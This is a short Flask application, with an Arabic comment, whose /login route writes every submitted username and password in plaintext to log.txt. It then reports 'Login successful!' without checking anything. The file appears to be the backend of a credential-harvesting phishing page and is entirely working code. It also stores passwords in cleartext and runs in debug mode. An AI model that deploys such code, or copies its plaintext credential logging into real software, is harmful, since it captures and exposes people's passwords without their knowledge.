from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # فتح ملف log.txt وحفظ البيانات فيه (a تعني الإضافة بنهاية الملف)
    with open('log.txt', 'a', encoding='utf-8') as file:
        file.write(f"Username: {username} | Password: {password}\n")
    
    return 'Login successful!'

if __name__ == '__main__':
    app.run(debug=True)
